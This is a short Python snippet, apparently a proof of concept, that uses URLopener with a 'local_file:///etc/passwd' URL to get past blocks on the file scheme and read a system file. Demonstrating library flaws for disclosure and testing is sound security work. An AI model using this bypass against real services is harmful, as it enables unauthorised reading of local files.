import urllib.request
req = urllib.request.URLopener().open('local_file:///etc/passwd')
print(req.read()[:30])
req.close()